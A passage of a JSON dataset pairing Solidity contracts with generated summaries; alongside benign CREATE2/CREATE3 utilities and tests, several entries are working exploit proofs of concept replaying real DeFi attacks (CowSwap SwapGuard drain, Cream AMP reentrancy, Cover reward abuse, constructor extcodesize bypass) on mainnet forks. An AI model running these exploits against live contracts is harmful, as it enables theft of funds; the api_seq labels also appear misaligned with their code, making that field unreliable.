\u68c0\u6d4b\u51fa\u3002\n    constructor(address addr) {\n        contractCheck = addr;\n        isContract = ContractCheck(addr).isContract(address(this));\n        // This will work\n        for(uint i; i < 10; i++){\n            ContractCheck(addr).mint();\n        }\n    }\n\n    // \u5408\u7ea6\u521b\u5efa\u597d\u4ee5\u540e\uff0cextcodesize > 0\uff0cisContract() \u53ef\u4ee5\u68c0\u6d4b\n    function mint() external {\n        ContractCheck(contractCheck).mint();\n    }\n}\n",
        "summary": "The code defines two contracts: ContractCheck and NotContract. \n\nContractCheck extends the ERC20 token contract and defines a function isContract that checks if a given address is a contract address or not by using the assembly function extcodesize. \n\nIt also defines a mint function that only allows non-contract addresses to call it and mints 100 tokens.\n\nNotContract creates an instance of ContractCheck in its constructor and uses its mint function in a for loop that executes ten times. The mint function is able to be called by NotContract before its contract bytecode is deployed because extcodesize returns zero during contract creation. This could be a vulnerability that allows a contract to abuse the system by minting more tokens.",
        "id": "9f70f3b5-21f1-469b-ade2-761b85d58fb3",
        "api_seq": "ConvertLib"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\nlibrary ConvertLib{\n\tfunction convert(uint amount,uint conversionRate) returns (uint convertedAmount)\n\t{\n\t\treturn amount * conversionRate;\n\t}\n}\n",
        "summary": "This code defines a Solidity library named \"ConvertLib\" that contains a function called \"convert\". The function takes in two unsigned integers (amount and conversionRate) and returns a convertedAmount which is the product of the two values. The library can be used in other smart contracts to convert between different units.",
        "id": "73d41ec6-6db4-4dd3-8c58-6fbdc2019805",
        "api_seq": "Cover_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface Blacksmith {\n  function claimRewardsForPools(address[] calldata _lpTokens) external;\n\n  function claimRewards(address _lpToken) external;\n\n  function deposit(address _lpToken, uint256 _amount) external;\n\n  function withdraw(address _lpToken, uint256 _amount) external;\n}\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  Blacksmith public bs = Blacksmith(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5);\n\n  IERC20 public bpt = IERC20(0x59686E01Aa841f622a43688153062C2f24F8fDed);\n\n  IERC20 public Cover = IERC20(0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286);\n\n  function setUp() public {\n    cheat.createSelectFork(\"mainnet\", 11542309); // fork mainnet at block 11542309\n  }\n\n  function test() public {\n    cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);\n    bs.deposit(address(bpt), 15255552810089260015361);\n    emit log_named_uint(\"Deposit BPT\", 15255552810089260015361);\n    cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);\n    //bs.withdraw(address(bpt),12345678);\n    bs.claimRewards(address(bpt));\n    emit log_named_uint(\n      \"After claimRewards, Cover Balance\",\n      Cover.balanceOf(0x00007569643bc1709561ec2E86F385Df3759e5DD)\n    );\n  }\n}\n",
        "summary": "This code defines a Solidity contract called `ContractTest` that imports and uses other Solidity contracts (`Test.sol` and `interface.sol`) and an external contract (`CheatCodes`). The contract has a `setUp()` function that sets up a fork of the Ethereum mainnet at a specific block number, and a `test()` function that calls a series of functions from the imported `Blacksmith` interface (which includes `deposit()`, `withdraw()`, and `claimRewards()` functions). The `emit` statement logs some results to the console. Overall, the code is likely a test or demonstration of some specific functionality related to the Blacksmith contract and possibly the Cover Token (`Cover`) and BPT Token (`bpt`).",
        "id": "ed198d71-04ef-463b-886b-e3d5488bf494",
        "api_seq": "CowSwap_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/MevRefund/status/1622793836291407873\n// https://twitter.com/peckshield/status/1622801412727148544\n// @TX\n// https://etherscan.io/tx/0x90b468608fbcc7faef46502b198471311baca3baab49242a4a85b73d4924379b\ninterface SwapGuard {\n    struct Data {\n        address target;\n        uint256 value;\n        bytes callData;\n    }\n\n    function envelope(\n        Data[] calldata interactions,\n        address vault,\n        IERC20[] calldata tokens,\n        uint256[] calldata tokenPrices,\n        int256[] calldata balanceChanges,\n        uint256 allowedLoss\n    ) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    SwapGuard swapGuard = SwapGuard(0xcD07a7695E3372aCD2B2077557DE93e667B92bd8);\n    address GPv2Settlement = 0x9008D19f58AAbD9eD0D60971565AA8510560ab41;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_574_048);\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(swapGuard), \"SwapGuard\");\n        vm.label(address(GPv2Settlement), \"GPv2Settlement\");\n    }\n\n    function testExploit() external {\n        uint256 amount = DAI.balanceOf(GPv2Settlement);\n        if (DAI.allowance(GPv2Settlement, address(swapGuard)) < amount) {\n            amount = DAI.allowance(GPv2Settlement, address(swapGuard));\n        }\n        bytes memory callDatas =\n            abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", GPv2Settlement, address(this), amount);\n        SwapGuard.Data[] memory interactions = new SwapGuard.Data[](1);\n        interactions[0] = SwapGuard.Data({target: address(DAI), value: 0, callData: callDatas});\n        address vault = address(this);\n        IERC20[] memory tokens = new IERC20[](1);\n        tokens[0] = DAI;\n        uint256[] memory tokenPrices = new uint256[](1);\n        tokenPrices[0] = 0;\n        int256[] memory balanceChanges = new int256[](1);\n        balanceChanges[0] = 0;\n        uint256 allowedLoss = type(uint256).max;\n        swapGuard.envelope(interactions, vault, tokens, tokenPrices, balanceChanges, allowedLoss);\n\n        emit log_named_decimal_uint(\"Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n    }\n}\n",
        "summary": "The code defines a `ContractTest` that is used to test an exploit against a smart contract called `SwapGuard`. The test uses the `setUp()` function to set up labels for certain addresses. The `testExploit()` function attempts to exploit a vulnerability found in the interaction between `GPv2Settlement` and `SwapGuard`. Specifically, the function transfers a certain amount of `DAI` tokens from `GPv2Settlement` to `ContractTest`, and then uses the `swapGuard.envelope()` function to interact with the `SwapGuard` contract by passing in certain data values as function arguments. The goal of the exploit is to allow the attacker to steal the transferred `DAI` tokens, resulting in an increase of the attacker's `DAI` token balance.",
        "id": "cbba9ff0-ee47-4378-8d35-39118bb6ed5f",
        "api_seq": "Cream_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  AMP amp = AMP(0xfF20817765cB7f73d4bde2e66e067E58D11095C2);\n\n  IERC1820Registry ierc1820 =\n    IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\n\n  bytes32 constant TOKENS_RECIPIENT_INTERFACE_HASH =\n    0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;\n\n  Uni_Pair_V2 uni = Uni_Pair_V2(0xd3d2E2692501A5c9Ca623199D38826e513033a17);\n\n  address constant WTH9_AMP_Pair_Address =\n    0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293;\n  address constant uin_WTH9_Pair_Address =\n    0xd3d2E2692501A5c9Ca623199D38826e513033a17;\n\n  WETH9 weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n  crETH creth = crETH(0xD06527D5e56A3495252A528C4987003b712860eE);\n\n  crAMP cramp = crAMP(0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6);\n\n  Uni_Router_V2 unirouterv2 =\n    Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n  address constant UniswapV2Router02_address =\n    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n  address constant crETH_Address = 0xD06527D5e56A3495252A528C4987003b712860eE;\n\n  address public mywallet;\n\n  address[] path = [\n    0xfF20817765cB7f73d4bde2e66e067E58D11095C2,\n    0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\n  ];\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 13125070); // fork mainnet at block 13125070\n  }\n\n  function test() public {\n    payable(address(0)).transfer(address(this).balance);\n    ierc1820.setInterfaceImplementer(\n      address(this),\n      TOKENS_RECIPIENT_INTERFACE_HASH,\n      address(this)\n    );\n\n    mywallet = msg.sender;\n    uni.swap(0, 500 * 1e18, address(this), \"0x00\");\n    emit log_named_uint(\n      \"Exploit completed, WETH Balance\",\n      weth.balanceOf(mywallet)\n    );\n  }\n\n  function uniswapV2Call(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) external {\n    weth.withdraw(500 * 1e18);\n    creth.mint{ value: 500 * 1e18 }();\n    creth.borrow(1 * 1e18);\n    cramp.accrueInterest();\n    cramp.borrow(19480000000000000000000000);\n    weth.deposit{ value: address(this).balance, gas: 40000 }();\n    amp.approve(UniswapV2Router02_address, 19480000000000000000000000000);\n    unirouterv2.swapExactTokensForTokens(\n      19480000000000000000000000,\n      1,\n      path,\n      address(this),\n      block.timestamp\n    );\n    weth.transfer(uin_WTH9_Pair_Address, 502 * 1e18);\n    weth.transfer(mywallet, weth.balanceOf(address(this)));\n  }\n\n  function tokensReceived(\n    bytes4 functionSig,\n    bytes32 partition,\n    address operator,\n    address from,\n    address to,\n    uint256 value,\n    bytes calldata data,\n    bytes calldata operatorData\n  ) external {\n    crETH(crETH_Address).borrow(354 * 1e18);\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that does the following:\n\n1. Imports several other Solidity contracts (\"Test.sol\", \"interface.sol\").\n2. Defines a contract named \"ContractTest\" that inherits from \"DSTest\".\n3. Initializes some constant variables and contract instances.\n4. Defines a function named \"setUp\" that sets up a test fork of the Ethereum mainnet.\n5. Defines a function named \"test\" that performs a series of actions related to swapping tokens on the Uniswap platform and borrowing and lending cryptocurrency.\n6. Defines a function named \"uniswapV2Call\" that is a callback function for the Uniswap V2 platform.\n7. Defines a function named \"tokensReceived\" that is a callback function for the \"IERC777\" token standard.\n8. Defines a \"receive\" function that is triggered when the contract receives ether.",
        "id": "a06fc0d0-7c5a-4033-968b-9c556c87317b",
        "api_seq": "Create"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Pair{\n    address public factory; // \u5de5\u5382\u5408\u7ea6\u5730\u5740\n    address public token0; // \u4ee3\u5e011\n    address public token1; // \u4ee3\u5e012\n\n    constructor() payable {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external {\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    }\n}\n\ncontract PairFactory{\n    mapping(address => mapping(address => address)) public getPair; // \u901a\u8fc7\u4e24\u4e2a\u4ee3\u5e01\u5730\u5740\u67e5Pair\u5730\u5740\n    address[] public allPairs; // \u4fdd\u5b58\u6240\u6709Pair\u5730\u5740\n\n    function createPair(address tokenA, address tokenB) external returns (address pairAddr) {\n        // \u521b\u5efa\u65b0\u5408\u7ea6\n        Pair pair = new Pair(); \n        // \u8c03\u7528\u65b0\u5408\u7ea6\u7684initialize\u65b9\u6cd5\n        pair.initialize(tokenA, tokenB);\n        // \u66f4\u65b0\u5730\u5740map\n        pairAddr = address(pair);\n        allPairs.push(pairAddr);\n        getPair[tokenA][tokenB] = pairAddr;\n        getPair[tokenB][tokenA] = pairAddr;\n    }\n}\n",
        "summary": "This is Solidity code for a decentralized exchange(DEX), specifically an implementation of a Pair and Pair Factory contracts. The Pair contract represents a pair of ERC20 tokens and includes the addresses of the tokens and a factory contract responsible for Pair creation. The Pair Factory contract creates, initializes, and keeps track of all of the Pair contracts created. When a new Pair contract is created, a new Pair contract address is appended to the allPairs array and the mapping getPair is updated accordingly.",
        "id": "0c0d5c15-04d6-4956-9751-5314c3b7ffad",
        "api_seq": "Create2"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Pair{\n    address public factory; // \u5de5\u5382\u5408\u7ea6\u5730\u5740\n    address public token0; // \u4ee3\u5e011\n    address public token1; // \u4ee3\u5e012\n\n    constructor() payable {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external {\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    }\n}\n\ncontract PairFactory2{\n        mapping(address => mapping(address => address)) public getPair; // \u901a\u8fc7\u4e24\u4e2a\u4ee3\u5e01\u5730\u5740\u67e5Pair\u5730\u5740\n        address[] public allPairs; // \u4fdd\u5b58\u6240\u6709Pair\u5730\u5740\n\n        function createPair2(address tokenA, address tokenB) external returns (address pairAddr) {\n            require(tokenA != tokenB, 'IDENTICAL_ADDRESSES'); //\u907f\u514dtokenA\u548ctokenB\u76f8\u540c\u4ea7\u751f\u7684\u51b2\u7a81\n            // \u8ba1\u7b97\u7528tokenA\u548ctokenB\u5730\u5740\u8ba1\u7b97salt\n            (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //\u5c06tokenA\u548ctokenB\u6309\u5927\u5c0f\u6392\u5e8f\n            bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n            // \u7528create2\u90e8\u7f72\u65b0\u5408\u7ea6\n            Pair pair = new Pair{salt: salt}(); \n            // \u8c03\u7528\u65b0\u5408\u7ea6\u7684initialize\u65b9\u6cd5\n            pair.initialize(tokenA, tokenB);\n            // \u66f4\u65b0\u5730\u5740map\n            pairAddr = address(pair);\n            allPairs.push(pairAddr);\n            getPair[tokenA][tokenB] = pairAddr;\n            getPair[tokenB][tokenA] = pairAddr;\n        }\n\n        // \u63d0\u524d\u8ba1\u7b97pair\u5408\u7ea6\u5730\u5740\n        function calculateAddr(address tokenA, address tokenB) public view returns(address predictedAddress){\n            require(tokenA != tokenB, 'IDENTICAL_ADDRESSES'); //\u907f\u514dtokenA\u548ctokenB\u76f8\u540c\u4ea7\u751f\u7684\u51b2\u7a81\n            // \u8ba1\u7b97\u7528tokenA\u548ctokenB\u5730\u5740\u8ba1\u7b97salt\n            (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //\u5c06tokenA\u548ctokenB\u6309\u5927\u5c0f\u6392\u5e8f\n            bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n            // \u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u65b9\u6cd5 hash()\n            predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(\n                bytes1(0xff),\n                address(this),\n                salt,\n                keccak256(type(Pair).creationCode)\n            )))));\n        }\n}\n",
        "summary": "This code defines two Solidity contracts. The first contract `Pair` has three public variables and a function `initialize` that can be called only by the contract that deployed it. The second contract `PairFactory2` defines a mapping to related addresses and two functions, `createPair2` and `calculateAddr`, used to create a new instance of the `Pair` contract. In the `createPair2` function, it ensures that the two input parameters are not the same and sorts them depending on their size, which helps calculate a unique address for a new `Pair` contract. The `calculateAddr` function is used to calculate the address of a new `Pair` contract without actually creating the contract.",
        "id": "6b3e2b48-03c2-4d23-809b-0d7cbfb866c7",
        "api_seq": "Create2Address.t"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {VyperDeployer} from \"utils/VyperDeployer.sol\";\n\nimport {Create2Impl} from \"./mocks/Create2Impl.sol\";\nimport {ERC20Mock} from \"./mocks/ERC20Mock.sol\";\n\nimport {ICreate2Address} from \"./interfaces/ICreate2Address.sol\";\n\ncontract Create2AddressTest is Test {\n    VyperDeployer private vyperDeployer = new VyperDeployer();\n    Create2Impl private create2Impl = new Create2Impl();\n\n    ICreate2Address private create2Address;\n\n    address private create2AddressAddr;\n\n    function setUp() public {\n        create2Address = ICreate2Address(\n            vyperDeployer.deployContract(\"src/utils/\", \"Create2Address\")\n        );\n        create2AddressAddr = address(create2Address);\n    }\n\n    function testComputeAddress() public {\n        bytes32 salt = keccak256(\"WAGMI\");\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        address arg3 = makeAddr(\"initialAccount\");\n        uint256 arg4 = 100;\n        bytes memory args = abi.encode(arg1, arg2, arg3, arg4);\n        bytes memory bytecode = abi.encodePacked(\n            vm.getCode(\"ERC20Mock.sol:ERC20Mock\"),\n            args\n        );\n        bytes32 bytecodeHash = keccak256(bytecode);\n        address create2AddressComputed = create2Address.compute_address(\n            salt,\n            bytecodeHash,\n            address(this)\n        );\n\n        ERC20Mock create2AddressComputedOnChain = new ERC20Mock{salt: salt}(\n            arg1,\n            arg2,\n            arg3,\n            arg4\n        );\n        assertEq(\n            create2AddressComputed,\n            address(create2AddressComputedOnChain)\n        );\n    }\n\n    function testComputeAddressSelf() public {\n        bytes32 salt = keccak256(\"WAGMI\");\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        address arg3 = makeAddr(\"initialAccount\");\n        uint256 arg4 = 100;\n        bytes memory args = abi.encode(arg1, arg2, arg3, arg4);\n        bytes memory bytecode = abi.encodePacked(\n            vm.getCode(\"ERC20Mock.sol:ERC20Mock\"),\n            args\n        );\n        bytes32 bytecodeHash = keccak256(bytecode);\n        address create2AddressComputed = create2Address.compute_address_self(\n            salt,\n            bytecodeHash\n        );\n        address create2AddressOZComputed = create2Impl\n            .computeAddressWithDeployer(salt, bytecodeHash, create2AddressAddr);\n\n        vm.prank(create2AddressAddr);\n        ERC20Mock create2AddressComputedOnChain = new ERC20Mock{salt: salt}(\n            arg1,\n            arg2,\n            arg3,\n            arg4\n        );\n        assertEq(create2AddressComputed, create2AddressOZComputed);\n        assertEq(\n            create2AddressComputed,\n            address(create2AddressComputedOnChain)\n        );\n    }\n\n    function testFuzzComputeAddress(bytes32 salt, address deployer) public {\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        address arg3 = makeAddr(\"initialAccount\");\n        uint256 arg4 = 100;\n        bytes memory args = abi.encode(arg1, arg2, arg3, arg4);\n        bytes memory bytecode = abi.encodePacked(\n            vm.getCode(\"ERC20Mock.sol:ERC20Mock\"),\n            args\n        );\n        bytes32 bytecodeHash = keccak256(bytecode);\n        address create2AddressComputed = create2Address.compute_address(\n            salt,\n            bytecodeHash,\n            deployer\n        );\n\n        vm.prank(deployer);\n        ERC20Mock create2AddressComputedOnChain = new ERC20Mock{salt: salt}(\n            arg1,\n            arg2,\n            arg3,\n            arg4\n        );\n        assertEq(\n            create2AddressComputed,\n            address(create2AddressComputedOnChain)\n        );\n    }\n\n    function testFuzzComputeAddressSelf(bytes32 salt) public {\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        address arg3 = makeAddr(\"initialAccount\");\n        uint256 arg4 = 100;\n        bytes memory args = abi.encode(arg1, arg2, arg3, arg4);\n        bytes memory bytecode = abi.encodePacked(\n            vm.getCode(\"ERC20Mock.sol:ERC20Mock\"),\n            args\n        );\n        bytes32 bytecodeHash = keccak256(bytecode);\n        address create2AddressComputed = create2Address.compute_address_self(\n            salt,\n            bytecodeHash\n        );\n        address create2AddressOZComputed = create2Impl\n            .computeAddressWithDeployer(salt, bytecodeHash, create2AddressAddr);\n\n        vm.prank(create2AddressAddr);\n        ERC20Mock create2AddressComputedOnChain = new ERC20Mock{salt: salt}(\n            arg1,\n            arg2,\n            arg3,\n            arg4\n        );\n        assertEq(create2AddressComputed, create2AddressOZComputed);\n        assertEq(\n            create2AddressComputed,\n            address(create2AddressComputedOnChain)\n        );\n    }\n}\n",
        "summary": "This is a Solidity contract that contains several test functions for testing the `Create2Address` contract. The functions include:\n1. `setUp`: instantiates `Create2Address` and sets its address as a private variable.\n2. `testComputeAddress`: tests the `compute_address` function of `Create2Address` by comparing the result of the contract implementation of `ERC20Mock` with the computed address.\n3. `testComputeAddressSelf`: tests the `compute_address_self` function of `Create2Address` by comparing the result of the contract implementation of `ERC20Mock` with the computed address using OpenZeppelin's `Create2` library.\n4. `testFuzzComputeAddress`: fuzz test for the `compute_address` function of `Create2Address`.\n5. `testFuzzComputeAddressSelf`: fuzz test for the `compute_address_self` function of `Create2Address`. \n\nThe contract imports other Solidity contracts and interfaces and uses VyperDeployer, a contract deployment helper tool. The code also includes a license identifier and specifies the Solidity version.",
        "id": "95dd2676-da7e-45b1-a1c2-975434968d93",
        "api_seq": "Create2Impl"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport {Create2} from \"openzeppelin/utils/Create2.sol\";\nimport {ERC1820Implementer} from \"openzeppelin/utils/introspection/ERC1820Implementer.sol\";\n\n/**\n * @title Create2Impl\n * @author pcaversaccio\n * @notice Forked and adjusted accordingly from here:\n * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a81b0d0b2136a0cca6029048be25c4e2bb230d49/contracts/mocks/Create2Impl.sol.\n * @dev Allows to test `CREATE2` deployments and address computation.\n */\ncontract Create2Impl {\n    /**\n     * @dev Deploys a contract using `CREATE2`. The address where the contract\n     * will be deployed can be known in advance via `computeAddress`.\n     * @param value The 32-byte ether value used to create the contract address.\n     * @param salt The 32-byte random value used to create the contract address.\n     * @param code The contract creation bytecode used to create the contract address.\n     */\n    function deploy(uint256 value, bytes32 salt, bytes memory code) public {\n        Create2.deploy(value, salt, code);\n    }\n\n    /**\n     * @dev Deploys an `ERC1820Implementer` contract using `CREATE2`. The address\n     * where the contract will be deployed can be known in advance via `computeAddress`.\n     * @param value The 32-byte ether value used to create the contract address.\n     * @param salt The 32-byte random value used to create the contract address.\n     */\n    function deployERC1820Implementer(uint256 value, bytes32 salt) public {\n        Create2.deploy(value, salt, type(ERC1820Implementer).creationCode);\n    }\n\n    /**\n     * @dev Returns the address where a contract will be stored if deployed via\n     * this contract using the `CREATE2` opcode. Any change in the `codeHash` or\n     * `salt` values will result in a new destination address.\n     * @param salt The 32-byte random value used to create the contract address.\n     * @param codeHash The 32-byte bytecode digest of the contract creation bytecode.\n     * @return address The 20-byte address where a contract will be stored.\n     */\n    function computeAddress(\n        bytes32 salt,\n        bytes32 codeHash\n    ) public view returns (address) {\n        return Create2.computeAddress(salt, codeHash);\n    }\n\n    /**\n     * @dev Returns the address where a contract will be stored if deployed via\n     * `deployer` using the `CREATE2` opcode. Any change in the `codeHash` or\n     * `salt` values will result in a new destination address.\n     * @param salt The 32-byte random value used to create the contract address.\n     * @param codeHash The 32-byte bytecode digest of the contract creation bytecode.\n     * @param deployer The 20-byte deployer address.\n     * @return address The 20-byte address where a contract will be stored.\n     */\n    function computeAddressWithDeployer(\n        bytes32 salt,\n        bytes32 codeHash,\n        address deployer\n    ) public pure returns (address) {\n        return Create2.computeAddress(salt, codeHash, deployer);\n    }\n\n    receive() external payable {}\n}\n",
        "summary": "This code defines a contract called Create2Impl that allows for testing the CREATE2 opcode in Solidity. The contract provides functions to deploy a contract using the CREATE2 opcode, to generate an address where the contract would be deployed, and to receive ether. It also imports the Create2 and ERC1820Implementer contracts from the OpenZeppelin library.",
        "id": "1e9586f0-0d55-42a7-8e9c-f4d87797695b",
        "api_seq": "CREATE3"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {Bytes32AddressLib} from \"./Bytes32AddressLib.sol\";\n\n/// @notice Deploy to deterministic addresses without an initcode factor.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/CREATE3.sol)\n/// @author Modified from 0xSequence (https://github.com/0xSequence/create3/blob/master/contracts/Create3.sol)\nlibrary CREATE3 {\n    using Bytes32AddressLib for bytes32;\n\n    //--------------------------------------------------------------------------------//\n    // Opcode     | Opcode + Arguments    | Description      | Stack View             //\n    //--------------------------------------------------------------------------------//\n    // 0x36       |  0x36                 | CALLDATASIZE     | size                   //\n    // 0x3d       |  0x3d                 | RETURNDATASIZE   | 0 size                 //\n    // 0x3d       |  0x3d                 | RETURNDATASIZE   | 0 0 size               //\n    // 0x37       |  0x37                 | CALLDATACOPY     |                        //\n    // 0x36       |  0x36                 | CALLDATASIZE     | size                   //\n    // 0x3d       |  0x3d                 | RETURNDATASIZE   | 0 size                 //\n    // 0x34       |  0x34                 | CALLVALUE        | value 0 size           //\n    // 0xf0       |  0xf0                 | CREATE           | newContract            //\n    //--------------------------------------------------------------------------------//\n    // Opcode     | Opcode + Arguments    | Description      | Stack View             //\n    //--------------------------------------------------------------------------------//\n    // 0x67       |  0x67XXXXXXXXXXXXXXXX | PUSH8 bytecode   | bytecode               //\n    // 0x3d       |  0x3d                 | RETURNDATASIZE   | 0 bytecode             //\n    // 0x52       |  0x52                 | MSTORE           |                        //\n    // 0x60       |  0x6008               | PUSH1 08         | 8                      //\n    // 0x60       |  0x6018               | PUSH1 18         | 24 8                   //\n    // 0xf3       |  0xf3                 | RETURN           |                        //\n    //--------------------------------------------------------------------------------//\n    bytes internal constant PROXY_BYTECODE = hex\"67_36_3d_3d_37_36_3d_34_f0_3d_52_60_08_60_18_f3\";\n\n    bytes32 internal constant PROXY_BYTECODE_HASH = keccak256(PROXY_BYTECODE);\n\n    function deploy(\n        bytes32 salt,\n        bytes memory creationCode,\n        uint256 value\n    ) internal returns (address deployed) {\n        bytes memory proxyChildBytecode = PROXY_BYTECODE;\n\n        address proxy;\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Deploy a new contract with our pre-made bytecode via CREATE2.\n            // We start 32 bytes into the code to avoid copying the byte length.\n            proxy := create2(0, add(proxyChildBytecode, 32), mload(proxyChildBytecode), salt)\n        }\n        require(proxy != address(0), \"DEPLOYMENT_FAILED\");\n\n        deployed = getDeployed(salt);\n        (bool success, ) = proxy.call{value: value}(creationCode);\n        require(success && deployed.code.length != 0, \"INITIALIZATION_FAILED\");\n    }\n\n    function getDeployed(bytes32 salt) internal view returns (address) {\n        address proxy = keccak256(\n            abi.encodePacked(\n                // Prefix:\n                bytes1(0xFF),\n                // Creator:\n                address(this),\n                // Salt:\n                salt,\n                // Bytecode hash:\n                PROXY_BYTECODE_HASH\n            )\n        ).fromLast20Bytes();\n\n        return\n            keccak256(\n                abi.encodePacked(\n                    // 0xd6 = 0xc0 (short RLP prefix) + 0x16 (length of: 0x94 ++ proxy ++ 0x01)\n                    // 0x94 = 0x80 + 0x14 (0x14 = the length of an address, 20 bytes, in hex)\n                    hex\"d6_94\",\n                    proxy,\n                    hex\"01\" // Nonce of the proxy contract (1)\n                )\n            ).fromLast20Bytes();\n    }\n}\n",
        "summary": "This code is a library called CREATE3 which allows for the deployment of contracts to deterministic addresses without an initcode factor. It utilizes CREATE2 opcode to create a new contract with pre-made bytecode. The library contains two functions - deploy and getDeployed. The deploy function creates the contract and then calls its constructor. The getDeployed function returns the address of the deployed contract. The library also imports a Bytes32AddressLib.sol library for use in encoding and decoding byte32 address types.",
        "id": "187f1f6f-db2f-44dd-b48c-456ab72c5e89",
        "api_seq": "CREATE3.t"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {WETH} from \"../tokens/WETH.sol\";\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {MockERC20} from \"./utils/mocks/MockERC20.sol\";\nimport {MockAuthChild} from \"./utils/mocks/MockAuthChild.sol\";\n\nimport {CREATE3} from \"../utils/CREATE3.sol\";\n\ncontract CREATE3Test is DSTestPlus {\n    function testDeployERC20() public {\n        bytes32 salt = keccak256(bytes(\"A salt!\"));\n\n        MockERC20 deployed = MockERC20(\n            CREATE3.deploy(\n                salt,\n                abi.encodePacked(type(MockERC20).creationCode, abi.encode(\"Mock Token\", \"MOCK\", 18)),\n                0\n            )\n        );\n\n        assertEq(address(deployed), CREATE3.getDeployed(salt));\n\n        assertEq(deployed.name(), \"Mock Token\");\n        assertEq(deployed.symbol(), \"MOCK\");\n        assertEq(deployed.decimals(), 18);\n    }\n\n    function testFailDoubleDeploySameBytecode() public {\n        bytes32 salt = keccak256(bytes(\"Salty...\"));\n\n        CREATE3.deploy(salt, type(MockAuthChild).creationCode, 0);\n        CREATE3.deploy(salt, type(MockAuthChild).creationCode, 0);\n    }\n\n    function testFailDoubleDeployDifferentBytecode() public {\n        bytes32 salt = keccak256(bytes(\"and sweet!\"));\n\n        CREATE3.deploy(salt, type(WETH).creationCode, 0);\n        CREATE3.deploy(salt, type(MockAuthChild).creationCode, 0);\n    }\n\n    function testDeployERC20(\n        bytes32 salt,\n        string calldata name,\n        string calldata symbol,\n        uint8 decimals\n    ) public {\n        MockERC20 deployed = MockERC20(\n            CREATE3.deploy(salt, abi.encodePacked(type(MockERC20).creationCode, abi.encode(name, symbol, decimals)), 0)\n        );\n\n        assertEq(address(deployed), CREATE3.getDeployed(salt));\n\n        assertEq(deployed.name(), name);\n        assertEq(deployed.symbol(), symbol);\n        assertEq(deployed.decimals(), decimals);\n    }\n\n    function testFailDoubleDeploySameBytecode(bytes32 salt, bytes calldata bytecode) public {\n        CREATE3.deploy(salt, bytecode, 0);\n        CREATE3.deploy(salt, bytecode, 0);\n    }\n\n    function 